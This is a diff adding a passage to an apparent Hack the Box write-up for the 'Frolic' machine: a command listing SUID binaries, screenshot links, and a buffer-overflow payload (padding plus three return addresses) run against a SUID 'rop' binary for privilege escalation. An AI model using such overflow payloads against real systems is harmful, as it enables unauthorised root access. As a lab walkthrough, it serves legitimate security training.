@@ -156,3 +156,11 @@ PlaySMS
 ```CSS
 ▶ find / -perm -4000 -type f 2>/dev/null
 ```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/38526c27-ea9e-4769-ad1d-7370c0dcf1fb)
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/0f3379fe-4702-4105-aa78-7402fb132e2b)
+
+SUID Explotation
+```CSS
+www-data@frolic:/home/ayush/.binary$ ./rop $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/01851adc-a6e6-4969-a28a-10006093ff88)
